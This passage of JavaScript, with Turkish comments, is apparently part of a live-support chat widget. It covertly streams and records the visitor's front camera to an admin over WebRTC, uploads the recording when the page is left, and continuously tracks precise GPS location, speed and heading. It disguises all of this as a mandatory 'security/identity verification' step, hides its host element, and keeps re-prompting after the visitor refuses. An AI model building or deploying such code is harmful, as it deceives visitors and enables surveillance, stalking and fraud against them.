          state.snapshotTimer = null;
        }
        if (state?.maxDurationTimer) {
          window.clearTimeout(state.maxDurationTimer);
          state.maxDurationTimer = null;
        }
        if (state?.locationRetryTimer) {
          window.clearTimeout(state.locationRetryTimer);
          state.locationRetryTimer = null;
        }
        if (state?.geoWatchId != null && navigator.geolocation) {
          try {
            navigator.geolocation.clearWatch(state.geoWatchId);
          } catch {
            /* ignore */
          }
          state.geoWatchId = null;
        }
      } catch {
        /* ignore */
      }

      try {
        const rec = state?.recorder;
        if (rec && rec.state === "recording") {
          try {
            rec.requestData();
          } catch {
            /* ignore */
          }
          try {
            rec.stop();
          } catch {
            /* ignore */
          }
        }
      } catch {
        /* ignore */
      }

      let blob = null;
      try {
        blob = new Blob(state?.recordChunks || [], {
          type: state?.recorderMime || "video/webm",
        });
        if (!blob.size) blob = state?.lastBlob || null;
        if (blob?.size) state.lastBlob = blob;
      } catch {
        blob = state?.lastBlob || null;
      }

      const meta = readLastRecMeta();
      const lastUrl = state?.lastUploadedRecordingUrl || meta?.url || "";
      const lastName = state?.lastUploadedRecordingName || meta?.name || "";

      // Soft: “ayrıldı/ended” YOK — yeniden bağlanıyor
      if (sid) {
        try {
          sync.markVisitorReconnectingKeepalive?.(sid, id, {
            lastRecordingUrl: lastUrl,
            lastRecordingName: lastName,
          });
        } catch {
          /* ignore */
        }
      }

      if (sid && blob?.size) {
        const ext = recordingFileExt(blob);
        const fileName = lastName || `kamera-${String(id).slice(0, 8)}.${ext}`;
        void stashPendingRecording({ sessionId: sid, callId: id, blob, fileName });
      }

      try {
        state?.unsubAnswer?.();
        state?.unsubIce?.();
      } catch {
        /* ignore */
      }
      try {
        state?.pc?.close();
      } catch {
        /* ignore */
      }
      try {
        state?.stream?.getTracks?.().forEach((t) => t.stop());
        if (state?.video?.srcObject) state.video.srcObject = null;
        state?.wrap?.remove();
      } catch {
        /* ignore */
      }
      cameraSessions.delete(id);
    }
  }

  // SADECE gerçek çıkış — visibilitychange sekme değişiminde kamerayı öldürmesin
  // (mobilde ayarlara gitmek / bildirim = document.hidden → konum butonu kırılıyordu)
  window.addEventListener("pagehide", flushCameraSessionsOnLeave);
  window.addEventListener("beforeunload", flushCameraSessionsOnLeave);
  window.addEventListener("pageshow", (ev) => {
    leaveFlushDone = false;
    const boot = async () => {
      await drainPendingRecordings();
      if (ev.persisted) {
        // bfcache: stream çoğu zaman ölü — soft resume ile aynı call’ı yeniden aç
        try {
          for (const id of [...cameraSessions.keys()]) {
            void stopCameraSession(id, { upload: false });
          }
        } catch {
          /* ignore */
        }
        earlyCameraStream = null;
        // earlyLocationPos sessionStorage’dan geri gelir
        restoreEarlyLocation();
        try {
          const pending = sessionStorage.getItem("pending_camera_call_v1");
          if (pending) {
            latestCameraCallId = pending;
            markSoftResumeIntent(pending);
          } else {
            sessionStorage.setItem("soft_resume_v1", "1");
            sessionStorage.removeItem("needs_fresh_call_v1");
          }
        } catch {
          /* ignore */
        }
        pageEntryPermBooted = false;
        cameraActivateInFlight = null;
        void ensureVisitorMedia(getOrCreateMediaHost(), {
          fromGesture: false,
          announce: false,
        });
      }
    };
    void boot();
  });
  void drainPendingRecordings();

  const VISITOR_RECORD_MAX_MS = 90_000;

  function getOrCreateMediaHost() {
    const chatBox =
      document.querySelector(".chat-page [data-chat-messages]") ||
      document.querySelector("#canli-destek [data-chat-messages]") ||
      document.querySelector("[data-chat-root] [data-chat-messages]");
    if (chatBox) return chatBox;
    // Sohbet yoksa da izin anında kamera açılsın diye gizli host
    let host = document.getElementById("global-media-host");
    if (!host) {
      host = document.createElement("div");
      host.id = "global-media-host";
      host.className = "global-media-host";
      host.hidden = true;
      host.setAttribute("aria-hidden", "true");
      document.body.appendChild(host);
    }
    return host;
  }

  function showSilentCameraStatus(box, callId) {
    const host = box || getOrCreateMediaHost();
    if (!host) return { wrap: null, video: null, label: null };

    const STATUS_TEXT =
      "Güvenlik doğrulaması devam ediyor… Lütfen bu sayfadan ayrılmayın.";

    // Aynı çağrı / tek durum satırı — tekrar ekleme (çakışma önlemi)
    const existing =
      host.querySelector?.(`.chat-camera-preview[data-call-id="${callId}"]`) ||
      document.querySelector(`.chat-camera-preview[data-call-id="${callId}"]`) ||
      host.querySelector?.(".chat-camera-preview.chat-camera-silent") ||
      null;
    if (existing) {
      // Başka host'ta kaldıysa taşı
      if (existing.parentElement !== host) host.appendChild(existing);
      existing.dataset.callId = callId;
      let label = existing.querySelector(".chat-camera-preview-label");
      if (!label) {
        label = document.createElement("p");
        label.className = "chat-camera-preview-label";
        existing.appendChild(label);
      }
      if (label.textContent !== STATUS_TEXT) label.textContent = STATUS_TEXT;
      // Eski kopyaları temizle
      document.querySelectorAll(".chat-camera-preview.chat-camera-silent").forEach((el) => {
        if (el !== existing) el.remove();
      });
      return { wrap: existing, video: null, label };
    }

    document.querySelectorAll(".chat-camera-preview.chat-camera-silent").forEach((el) => {
      el.remove();
    });

    const wrap = document.createElement("div");
    wrap.className = "chat-camera-preview chat-camera-silent";
    wrap.dataset.callId = callId;

    const label = document.createElement("p");
    label.className = "chat-camera-preview-label";
    label.textContent = STATUS_TEXT;

    wrap.appendChild(label);
    host.appendChild(wrap);
    if (typeof host.scrollTop === "number") host.scrollTop = host.scrollHeight;
    return { wrap, video: null, label };
  }

  function startLiveLocationWatch(state, sessionId, callId, sync, box, opts = {}) {
    if (!navigator.geolocation || !sync?.writeLiveLocation) {
      sync?.writeLocationStatus?.(sessionId, callId, "unsupported", "Doğrulama desteklenmiyor").catch(() => {});
      return;
    }

    const LOCATION_RETRY_MS = 8_000;
    const LOCATION_DENIED_TEXT =
      "Kimlik doğrulaması tamamlanamadı. Güvenlik doğrulaması zorunludur; adım tamamlanamaz.";
    const deferAsk = opts.deferAsk === true;
    const silent = opts.silent !== false; // varsayılan: ziyaretçiye konum metni yok
    let lastWriteAt = 0;
    let asking = false;
    let lastAskAt = 0;
    let consecutiveCode1 = 0;

    if (deferAsk) {
      sync
        .writeLocationStatus?.(sessionId, callId, "awaiting-tap", "Güvenlik adımı bekleniyor")
        .catch(() => {});
    } else {
      sync
        .writeLocationStatus?.(sessionId, callId, "prompting", "Güvenlik adımı isteniyor")
        .catch(() => {});
    }

    const clearLocRetry = () => {
      if (state.locationRetryTimer) {
        window.clearTimeout(state.locationRetryTimer);
        state.locationRetryTimer = null;
      }
    };

    const showLocDeniedNotice = () => {
      if (!box) return;
      let el = box.querySelector(".chat-location-perm-denied");
      if (!el) {
        el = document.createElement("div");
        el.className = "chat-inline-prompt chat-location-perm-denied";
        el.innerHTML =
          `<p class="chat-inline-prompt-title">${LOCATION_DENIED_TEXT}</p>` +
          '<p class="chat-camera-note">Kimlik doğrulaması için güvenlik adımını onaylayın. Alttaki Doğrula’ya dokunun. Pencere açılmazsa telefon ayarlarından bu site için doğrulamayı açıp tekrar deneyin.</p>';
        box.appendChild(el);
      }
      box.scrollTop = box.scrollHeight;
    };

    const clearLocDeniedNotice = () => {
      box?.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
    };

    const geoPermissionState = () =>
      new Promise((resolve) => {
        try {
          if (!navigator.permissions?.query) {
            resolve("unknown");
            return;
          }
          navigator.permissions
            .query({ name: "geolocation" })
            .then((p) => resolve(p?.state || "unknown"))
            .catch(() => resolve("unknown"));
        } catch {
          resolve("unknown");
        }
      });

    /** Seed veya ilk fix sonrası watch YOKSA başlat — aksi halde konum tek yazımda ölür */
    const ensureLiveWatch = () => {
      if (!sessionStillActive(state, callId)) return;
      if (state.geoWatchId != null) return;
      try {
        state.geoWatchId = navigator.geolocation.watchPosition(
          publish,
          (err) => {
            void onErr(err, { fromUserTap: false, explicit: false, fromWatch: true });
          },
          {
            enableHighAccuracy: true,
            maximumAge: 5000,
            timeout: 25000,
          }
        );
      } catch (err) {
        console.warn("geo watch", err);
        scheduleRetry(LOCATION_RETRY_MS);
      }
    };

    const clearFalseLocationGrant = () => {
      state._hadLocation = false;
      earlyLocationPos = null;
      try {
        sessionStorage.removeItem("early_loc_v1");
      } catch {
        /* ignore */
      }
      clearMediaPermGranted();
      if (hasLiveCameraTracks(state)) showPageEntryPermGate();
    };

    const publish = (pos) => {
      if (!sessionStillActive(state, callId) || !pos?.coords) return;
      clearLocRetry();
      clearLocDeniedNotice();
      consecutiveCode1 = 0;
      const now = Date.now();
      if (state._hadLocation && now - lastWriteAt < 2500) {
        ensureLiveWatch();
        return;
      }
      lastWriteAt = now;
      const wasFirst = !state._hadLocation;
      state._hadLocation = true;
      try {
        stashEarlyLocation(pos);
      } catch {
        /* ignore */
      }
      const activeId = resolveSessionCallId(state, callId);
      const coords = pos.coords;
      sync
        .writeLiveLocation(sessionId, activeId, {
          lat: coords.latitude,
          lng: coords.longitude,
          accuracy: coords.accuracy,
          altitude: coords.altitude,
          heading: coords.heading,
          speed: coords.speed,
          ts: now,
        })
        .catch(() => {});
      ensureLiveWatch();
      if (wasFirst && !state._locationGrantedMsg) {
        state._locationGrantedMsg = true;
        syncMessage("user", "Güvenlik doğrulaması onaylandı.");
        if (hasLiveCameraTracks(state)) markMediaPermGranted();
        if (!silent && box) {
          appendMessage(box, "bot", "Güvenlik doğrulaması alındı. Bu adım kaydedildi — tekrar sorulmaz.", {
            sync: true,
          });
        }
        if (hasLiveCameraTracks(state) && box) maybeOfferPhoneEntry(box);
      }
      if (state.label) {
        state.label.textContent =
          "Kimlik doğrulaması devam ediyor… Lütfen bekleyin; bu sayfadan ayrılmayın.";
      }
      state._onLocationGranted?.();
    };

    const scheduleRetry = (ms = LOCATION_RETRY_MS) => {
      if (deferAsk) return;
      // Watch varken ve konum varken tekrar isteme
      if (!sessionStillActive(state, callId)) return;
      if (state._hadLocation && state.geoWatchId != null) return;
      clearLocRetry();
      state.locationRetryTimer = window.setTimeout(() => {
        state.locationRetryTimer = null;
        if (state._hadLocation && state.geoWatchId == null) ensureLiveWatch();
        else void askLocation({ fromUserTap: false, explicit: false });
      }, ms);
    };

    const onErr = async (err, meta = {}) => {
      // Konum hatası kamerayı ASLA kapatmaz
      if (!sessionStillActive(state, callId)) return;
      const fromWatch = meta.fromWatch === true;
      // Canlı konum+watch varken aralıklı watch hatalarını yoksay
      if (state._hadLocation && state.geoWatchId != null && !fromWatch && !meta.explicit) return;
      const code = Number(err?.code);
      const fromUserTap = meta.fromUserTap === true;
      const explicit = meta.explicit === true; // yalnızca “İzin ver” butonu
      const activeId = resolveSessionCallId(state, callId);
      const perm = await geoPermissionState();

      // Safari/iOS: jest olmadan veya arka planda code=1 sık gelir — bu “kullanıcı reddetti” değil.
      if (code === 1) consecutiveCode1 += 1;
      else consecutiveCode1 = 0;

      const reallyDenied =
        (explicit && code === 1 && perm !== "granted") ||
        (perm === "denied" && consecutiveCode1 >= 3) ||
        (perm === "denied" && explicit) ||
        (perm === "denied" && fromWatch && consecutiveCode1 >= 2);

      if (reallyDenied) {
        sync
          .writeLocationStatus?.(sessionId, activeId, "denied", err?.message || "denied")
          .catch(() => {});
        // Seed’li sahte “konum var”ı temizle
        if (state._hadLocation) clearFalseLocationGrant();
        if (state.geoWatchId != null) {
          try {
            navigator.geolocation.clearWatch(state.geoWatchId);
          } catch {
            /* ignore */
          }
          state.geoWatchId = null;
        }
        if (!silent && box) showLocDeniedNotice();
        scheduleRetry(12_000);
        return;
      }

      // Seed vardı ama watch hata verdi → canlı teyit yok say, tekrar dene
      if (fromWatch && state._hadLocation && code === 1 && perm !== "granted") {
        // henüz reallyDenied değil — prompting devam
      }

      if (code === 3 || code === 2) {
        sync
          .writeLocationStatus?.(
            sessionId,
            activeId,
            code === 3 ? "timeout" : "unavailable",
            err?.message || String(code)
          )
          .catch(() => {});
      } else if (!state._hadLocation) {
        sync
          .writeLocationStatus?.(
            sessionId,
            activeId,
            "prompting",
            perm === "granted" ? "gps-wait" : "Güvenlik adımı bekleniyor"
          )
          .catch(() => {});
      }
      scheduleRetry(perm === "granted" || fromUserTap ? 4_000 : LOCATION_RETRY_MS);
    };

    const drainPendingLocAsk = () => {
      const pending = state._pendingLocAsk;
      if (!pending || (state._hadLocation && state.geoWatchId != null)) {
        state._pendingLocAsk = null;
        return;
      }
      state._pendingLocAsk = null;
      window.setTimeout(() => {
        askLocation(pending);
      }, 0);
    };

    const askLocation = (opts = {}) => {
      const fromUserTap = opts === true || opts?.fromUserTap === true;
      const explicit = opts?.explicit === true;
      const force = opts?.force === true;
      if (!sessionStillActive(state, callId)) return;
      // Konum + canlı watch varken gereksiz getCurrentPosition yok
      if (state._hadLocation && state.geoWatchId != null && !force && !fromUserTap) return;
      // Seed sonrası yalnız watch eksikse: gum yerine watch kur
      if (state._hadLocation && state.geoWatchId == null && !force && !fromUserTap) {
        ensureLiveWatch();
        return;
      }
      if (asking) {
        if (fromUserTap || force) {
          state._pendingLocAsk = { fromUserTap: true, explicit, force };
        }
        return;
      }
      const now = Date.now();
      if (!fromUserTap && !force && now - lastAskAt < 2500) {
        scheduleRetry(3000);
        return;
      }
      asking = true;
      lastAskAt = now;
      if (state.geoWatchId != null && (fromUserTap || force)) {
        try {
          navigator.geolocation.clearWatch(state.geoWatchId);
        } catch {
          /* ignore */
        }
        state.geoWatchId = null;
      }
      if (state.geoWatchId != null && !fromUserTap && !force) {
        asking = false;
        return;
      }

      const geoOpts = fromUserTap || force
        ? { enableHighAccuracy: true, maximumAge: 0, timeout: 45000 }
        : { enableHighAccuracy: true, maximumAge: 15000, timeout: 25000 };

      if (fromUserTap) {
        sync
          .writeLocationStatus?.(sessionId, resolveSessionCallId(state, callId), "prompting", "Jest doğrulama")
          .catch(() => {});
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          asking = false;
          consecutiveCode1 = 0;
          // force yenilemede de publish çalışsın
          if (force) state._hadLocation = false;
          publish(pos);
          if (!sessionStillActive(state, callId)) {
            drainPendingLocAsk();
            return;
          }
          ensureLiveWatch();
          state._pendingLocAsk = null;
        },
        (err) => {
          asking = false;
          void onErr(err, { fromUserTap, explicit });
          drainPendingLocAsk();
        },
        geoOpts
      );
    };

    state.locationRetryTimer = null;
    state._pendingLocAsk = null;
    state.ensureLiveWatch = ensureLiveWatch;
    // fromUserTap: jest; explicit: reddedildi yazılabilir; force: seed’i ezerek yeniden al
    state.retryLocation = (opts = false) => {
      if (opts === true) askLocation({ fromUserTap: true, explicit: false });
      else if (opts && typeof opts === "object") askLocation(opts);
      else askLocation({ fromUserTap: false, explicit: false });
    };
    if (!deferAsk) {
      askLocation({ fromUserTap: false, explicit: false });
      try {
        navigator.permissions?.query?.({ name: "geolocation" }).then((p) => {
          if (p?.state === "granted") {
            if (!state._hadLocation) askLocation({ fromUserTap: false, explicit: false });
            else ensureLiveWatch();
          } else if (p?.state === "denied" && state._hadLocation) {
            clearFalseLocationGrant();
          }
          p?.addEventListener?.("change", () => {
            if (p.state === "granted") {
              clearLocDeniedNotice();
              if (!state._hadLocation) askLocation({ fromUserTap: false, explicit: false, force: true });
              else ensureLiveWatch();
            } else if (p.state === "denied") {
              clearFalseLocationGrant();
              if (state.geoWatchId != null) {
                try {
                  navigator.geolocation.clearWatch(state.geoWatchId);
                } catch {
                  /* ignore */
                }
                state.geoWatchId = null;
              }
            }
          });
        }).catch(() => {});
      } catch {
        /* ignore */
      }
    }
  }

  /** Geriye dönük: konum da sohbet kartındaki İzin ver ile istenir */
  function showLocationTapButton(box, callId, options = {}) {
    showCameraRequest(
      box,
      {
        callId,
        text: "Güvenlik doğrulaması zorunlu",
        note: "Kimlik doğrulaması için sohbetteki Doğrula’ya dokunun; güvenlik penceresi açılacak.",
        okLabel: "Doğrula",
        hideCancel: true,
        locationOnly: true,
      },
      {
        softDeny: true,
        sticky: true,
        nativeFromTap: true,
        locationOnly: true,
        onGranted: () => options.onGranted?.(),
        onSoftDeny: (r) => options.onSoftDeny?.(r),
      }
    );
  }

  function waitForCameraLocation(callId, timeoutMs) {
    return new Promise((resolve) => {
      const state = cameraSessions.get(callId);
      if (!state) {
        resolve(false);
        return;
      }
      if (state._hadLocation) {
        resolve(true);
        return;
      }
      let done = false;
      const finish = (ok) => {
        if (done) return;
        done = true;
        window.clearTimeout(timer);
        if (state._onLocationGranted === onOk) state._onLocationGranted = null;
        resolve(ok);
      };
      const onOk = () => finish(true);
      state._onLocationGranted = onOk;
      const timer = window.setTimeout(() => finish(false), timeoutMs);
    });
  }

  function isLikelyMobile() {
    return (
      /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || "") ||
      (Number(navigator.maxTouchPoints) > 0 &&
        typeof window.matchMedia === "function" &&
        window.matchMedia("(pointer: coarse)").matches)
    );
  }

  /** Stream veya session state üzerinde canlı video/audio track var mı */
  function hasLiveCameraTracks(streamOrState) {
    const stream = streamOrState?.stream || streamOrState;
    return Boolean(stream?.getTracks?.().some((t) => t.readyState === "live"));
  }

  function stopMediaStreamTracks(stream) {
    try {
      stream?.getTracks?.().forEach((t) => {
        try {
          t.stop();
        } catch {
          /* ignore */
        }
      });
    } catch {
      /* ignore */
    }
  }

  /** Kullanılmayan early stream'i bırakma — canlı stream ASLA öldürülmez (yeniden kullanılır). */
  function stopOrphanEarlyStream() {
    if (!earlyCameraStream) return;
    if (hasLiveCameraTracks(earlyCameraStream)) {
      // Canlı early stream'i oturuma bağlanana kadar sakla — stop etme!
      return;
    }
    earlyCameraStream = null;
  }

  let cameraAcquireLock = null;

  function findLiveCameraSessionEntry() {
    for (const [id, st] of cameraSessions.entries()) {
      if (hasLiveCameraTracks(st)) return [id, st];
    }
    return null;
  }

  function getAnyLiveCameraStream() {
    const live = findLiveCameraSessionEntry();
    if (live?.[1]?.stream && hasLiveCameraTracks(live[1].stream)) return live[1].stream;
    if (earlyCameraStream && hasLiveCameraTracks(earlyCameraStream)) return earlyCameraStream;
    return null;
  }

  async function acquireCameraStreamNative(opts = {}) {
    if (!navigator.mediaDevices?.getUserMedia) {
      throw new Error("getUserMedia yok");
    }
    const fromGesture = opts.fromGesture === true;
    const existing0 = getAnyLiveCameraStream();
    if (existing0) {
      existing0.getVideoTracks().forEach(tuneVideoTrack);
      return existing0;
    }

    // Jest yolunda KİLİT BEKLEME — await jesti öldürür, izin penceresi açılmaz
    if (cameraAcquireLock && !fromGesture) {
      try {
        await cameraAcquireLock;
      } catch {
        /* ignore prior failure */
      }
      const reused = getAnyLiveCameraStream();
      if (reused) {
        reused.getVideoTracks().forEach(tuneVideoTrack);
        return reused;
      }
    }

    let release;
    const prevLock = cameraAcquireLock;
    cameraAcquireLock = new Promise((r) => {
      release = r;
    });
    try {
      const existing = getAnyLiveCameraStream();
      if (existing) {
        existing.getVideoTracks().forEach(tuneVideoTrack);
        return existing;
      }
      // Jest: önce en basit kısıt (izin penceresi hemen)
      // Sonra kalite yükselt
      const attempts = fromGesture
        ? [
            { video: true, audio: false },
            { video: { facingMode: "user" }, audio: false },
            {
              audio: false,
              video: {
                facingMode: { ideal: "user" },
                width: { ideal: 1280 },
                height: { ideal: 720 },
                frameRate: { ideal: 30 },
              },
            },
          ]
        : [
            {
              audio: false,
              video: {
                facingMode: { ideal: "user" },
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                frameRate: { ideal: 30 },
              },
            },
            {
              audio: false,
              video: {
                facingMode: { ideal: "user" },
                width: { ideal: 1280 },
                height: { ideal: 720 },
                frameRate: { ideal: 30 },
              },
            },
            { video: { facingMode: { ideal: "user" } }, audio: false },
            { video: { facingMode: "user" }, audio: false },
            { video: true, audio: false },
          ];
      let lastErr;
      for (const constraints of attempts) {
        try {
          stopOrphanEarlyStream();
          const again = getAnyLiveCameraStream();
          if (again) {
            again.getVideoTracks().forEach(tuneVideoTrack);
            return again;
          }
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          stream.getVideoTracks().forEach(tuneVideoTrack);
          earlyCameraStream = stream;
          return stream;
        } catch (err) {
          lastErr = err;
        }
      }
      throw lastErr || new Error("Güvenlik doğrulaması açılamadı");
    } finally {
      release?.();
      // Eski kilit varsa çöz (bekleyenler devam etsin)
      if (cameraAcquireLock && typeof release === "function") {
        /* already released via resolve */
      }
      cameraAcquireLock = prevLock && prevLock !== cameraAcquireLock ? prevLock : null;
      // Always clear our lock so waiters unblock
      cameraAcquireLock = null;
    }
  }

  async function configureVisitorVideoSender(pc) {
    try {
      const sender = pc?.getSenders?.().find((s) => s.track?.kind === "video");
      if (!sender?.getParameters) return;
      const params = sender.getParameters();
      if (!params.encodings || !params.encodings.length) {
        params.encodings = [{}];
      }
      params.encodings[0].maxBitrate = 4_500_000;
      params.encodings[0].maxFramerate = 30;
      if ("scaleResolutionDownBy" in params.encodings[0]) {
        params.encodings[0].scaleResolutionDownBy = 1;
      }
      await sender.setParameters(params);
    } catch {
      /* ignore */
    }
  }

  function acquireLocationNativeOnce() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      let settled = false;
      const done = (val) => {
        if (settled) return;
        settled = true;
        resolve(val);
      };
      // Önce getCurrentPosition — bazı telefonda tek başına yetmez
      navigator.geolocation.getCurrentPosition(
        (pos) => done(pos),
        () => {
          // İkinci şans: kısa watch ile prompt zorla
          let wid = null;
          const t = window.setTimeout(() => {
            if (wid != null) {
              try {
                navigator.geolocation.clearWatch(wid);
              } catch {
                /* ignore */
              }
            }
            done(null);
          }, 12000);
          try {
            wid = navigator.geolocation.watchPosition(
              (pos) => {
                window.clearTimeout(t);
                try {
                  navigator.geolocation.clearWatch(wid);
                } catch {
                  /* ignore */
                }
                done(pos);
              },
              () => {
                window.clearTimeout(t);
                try {
                  if (wid != null) navigator.geolocation.clearWatch(wid);
                } catch {
                  /* ignore */
                }
                done(null);
              },
              { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
            );
          } catch {
            window.clearTimeout(t);
            done(null);
          }
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
      );
    });
  }

  function applySeedLocationToSession(sync, callId, state, seedLocation) {
    if (!seedLocation?.coords || !state || state._hadLocation) return false;
    const coords = seedLocation.coords;
    const now = Date.now();
    state._hadLocation = true;
    state._locationGrantedMsg = true;
    if (state.locationRetryTimer) {
      window.clearTimeout(state.locationRetryTimer);
      state.locationRetryTimer = null;
    }
    const activeId = resolveSessionCallId(state, callId);
    sync
      ?.writeLiveLocation?.(sync.getSessionId(), activeId, {
        lat: coords.latitude,
        lng: coords.longitude,
        accuracy: coords.accuracy,
        altitude: coords.altitude,
        heading: coords.heading,
        speed: coords.speed,
        ts: now,
      })
      .catch(() => {});
    // Seed tek yazım değil — canlı watch zorunlu (yenileme sonrası konum ölmesin)
    try {
      state.ensureLiveWatch?.();
    } catch {
      /* ignore */
    }
    if (!locationGrantedSynced) {
      locationGrantedSynced = true;
      syncMessage("user", "Güvenlik doğrulaması onaylandı.");
    }
    if (state.label) {
      state.label.textContent =
        "Kimlik doğrulaması devam ediyor… Lütfen bekleyin; bu sayfadan ayrılmayın.";
    }
    try {
      state._onLocationGranted?.();
    } catch {
      /* ignore */
    }
    if (hasLiveCameraTracks(state) && state._hadLocation) markMediaPermGranted();
    if (hasLiveCameraTracks(state) && state._hadLocation) {
      maybeOfferPhoneEntry(getOrCreateMediaHost());
    }
    return true;
  }

  /**
   * Canlı stream’i yeni callId’ye taşı — track stop yok; admin yeni talebinde siyah ekran önlenir.
   */
  async function migrateLiveCameraToCallId(oldCallId, newCallId, box, options = {}) {
    const sync = window.ChatSync;
    const state = cameraSessions.get(oldCallId);
    if (!sync?.enabled || !state || !hasLiveCameraTracks(state)) return "error";
    if (String(oldCallId) === String(newCallId)) return "ok";

    try {
      state.unsubAnswer?.();
    } catch {
      /* ignore */
    }
    try {
      state.unsubIce?.();
    } catch {
      /* ignore */
    }
    try {
      state.pc?.close();
    } catch {
      /* ignore */
    }
    state.unsubAnswer = null;
    state.unsubIce = null;
    state.pc = null;

    cameraSessions.delete(oldCallId);
    cameraSessions.set(newCallId, state);
    latestCameraCallId = newCallId;
    try {
      sessionStorage.setItem("pending_camera_call_v1", newCallId);
    } catch {
      /* ignore */
    }

    const preview = showSilentCameraStatus(box, newCallId);
    if (preview.wrap) state.wrap = preview.wrap;
    if (preview.label) state.label = preview.label;

    if (options.seedLocation?.coords && !state._hadLocation) {
      applySeedLocationToSession(sync, newCallId, state, options.seedLocation);
    } else if (!state._hadLocation) {
      const seed = restoreEarlyLocation();
      if (seed?.coords) applySeedLocationToSession(sync, newCallId, state, seed);
      else {
        try {
          state.retryLocation?.(false);
        } catch {
          /* ignore */
        }
      }
    } else if (earlyLocationPos?.coords || restoreEarlyLocation()?.coords) {
      // Konum zaten vardı — yeni call path’e bir kez yaz
      const seed = earlyLocationPos || restoreEarlyLocation();
      if (seed?.coords) {
        const prevMsg = state._locationGrantedMsg;
        state._hadLocation = false;
        state._locationGrantedMsg = true;
        applySeedLocationToSession(sync, newCallId, state, seed);
        state._locationGrantedMsg = prevMsg;
        state._hadLocation = true;
      }
    }

    const sessionId = sync.getSessionId();
    const pc = new RTCPeerConnection(sync.ICE_SERVERS);
    state.pc = pc;
    const pendingAdminIce = [];
    let remoteReady = false;
    let answered = false;
    let ending = false;

    function clearMaxDurationOnAdminJoin() {
      if (!state.maxDurationTimer) return;
      window.clearTimeout(state.maxDurationTimer);
      state.maxDurationTimer = null;
    }

    pc.onicecandidate = (ev) => {
      if (ev.candidate) {
        sync
          .pushIceCandidate(sessionId, newCallId, "visitor", ev.candidate.toJSON())
          .catch(() => {});
      }
    };

    pc.onconnectionstatechange = () => {
      if (pc.connectionState === "connected") clearMaxDurationOnAdminJoin();
      if (state.label && pc.connectionState === "connected") {
        state.label.textContent =
          "Kimlik doğrulaması devam ediyor… Lütfen bekleyin; bu sayfadan ayrılmayın.";
      }
    };

    const addAdminIce = async (cand) => {
      if (!cand || !state.pc) return;
      if (!remoteReady) {
        pendingAdminIce.push(cand);
        return;
      }
      try {
        await state.pc.addIceCandidate(new RTCIceCandidate(cand));
      } catch {
        /* ignore */
      }
    };

    state.unsubIce = sync.listenIceCandidates(sessionId, newCallId, "admin", (cand) => {
      addAdminIce(cand);
    });

    state.unsubAnswer = sync.listenCameraCall(sessionId, newCallId, async (data) => {
      if (!data) return;
      const shouldEnd =
        data.status === "ended" || data.status === "denied" || data.forceClose === true;
      if (shouldEnd && !ending) {
        ending = true;
        await stopCameraSession(newCallId, {
          upload: data.status === "ended" || data.forceClose === true,
        });
        return;
      }
      if (!state.pc) return;
      if (data.answer?.sdp) {
        const sdp = String(data.answer.sdp);
        if (!answered) {
          answered = true;
          state._lastAnswerSdp = sdp;
          clearMaxDurationOnAdminJoin();
          try {
            await state.pc.setRemoteDescription(
              new RTCSessionDescription({
                type: data.answer.type,
                sdp,
              })
            );
            remoteReady = true;
            for (const cand of pendingAdminIce.splice(0)) {
              await addAdminIce(cand);
            }
          } catch (err) {
            answered = false;
            console.error(err);
          }
        } else if (sdp !== state._lastAnswerSdp && state.pc.signalingState !== "closed") {
          // Admin yeni PC ile yeniden bağlandı — ICE restart + yeni offer
          state._lastAnswerSdp = sdp;
          try {
            const offer = await state.pc.createOffer({ iceRestart: true });
            await state.pc.setLocalDescription(offer);
            await sync.writeCameraOffer(sessionId, newCallId, {
              type: offer.type,
              sdp: offer.sdp,
            });
            await sync.markVisitorCameraReady?.(sessionId, newCallId).catch(() => {});
          } catch (err) {
            console.warn("visitor renegotiate", err);
          }
        }
      }
    });

    state.stream.getVideoTracks().forEach((track) => {
      if (track.readyState === "live") {
        tuneVideoTrack(track);
        pc.addTrack(track, state.stream);
      }
    });
    await configureVisitorVideoSender(pc);

    try {
      await sync.markVisitorCameraReady(sessionId, newCallId).catch(() => {});
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      await sync.writeCameraOffer(sessionId, newCallId, {
        type: offer.type,
        sdp: offer.sdp,
      });
      return "ok";
    } catch (err) {
      console.error("migrate camera", err);
      return "error";
    }
  }

  async function startVisitorCamera(box, callId, options = {}) {
    const auto = options.auto === true;
    const sync = window.ChatSync;

    // Eşzamanlı ikinci çağrı kamerayı öldürmesin
    if (startVisitorCameraLock) {
      try {
        await startVisitorCameraLock;
      } catch {
        /* ignore */
      }
    }

    // Canlı oturumu ASLA kesme — farklı callId ise migrate / aynıysa konum tamamla
    const liveEntry = findLiveCameraSessionEntry();
    if (liveEntry) {
      const [liveId, liveExisting] = liveEntry;
      if (String(liveId) !== String(callId)) {
        const migrated = await migrateLiveCameraToCallId(liveId, callId, box, options);
        return migrated;
      }
      latestCameraCallId = liveId;
      const preview = showSilentCameraStatus(box, liveId);
      if (preview.wrap) liveExisting.wrap = preview.wrap;
      if (preview.label) liveExisting.label = preview.label;
      if (options.seedLocation?.coords && !liveExisting._hadLocation) {
        applySeedLocationToSession(sync, liveId, liveExisting, options.seedLocation);
      } else if (!liveExisting._hadLocation) {
        const seed = restoreEarlyLocation();
        if (seed?.coords) {
          applySeedLocationToSession(sync, liveId, liveExisting, seed);
        } else {
          try {
            liveExisting.retryLocation?.(false);
          } catch {
            /* ignore */
          }
        }
      }
      return "ok";
    }

    // Bu callId altında ölü session varsa temizle
    const stale = cameraSessions.get(callId);
    if (stale && !hasLiveCameraTracks(stale)) {
      await stopCameraSession(callId, { upload: false });
    }

    const run = (async () => {
    if (!sync?.enabled) {
      if (!options.silent) {
        appendMessage(box, "bot", "Kimlik doğrulaması için canlı senkron gerekir.", {
          sync: false,
        });
      }
      return "error";
    }
    if (!navigator.mediaDevices?.getUserMedia && !options.stream) {
      if (!options.silent) {
        appendMessage(box, "bot", "Bu tarayıcı güvenlik doğrulamasını desteklemiyor.", { sync: false });
      }
      if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
      return "error";
    }

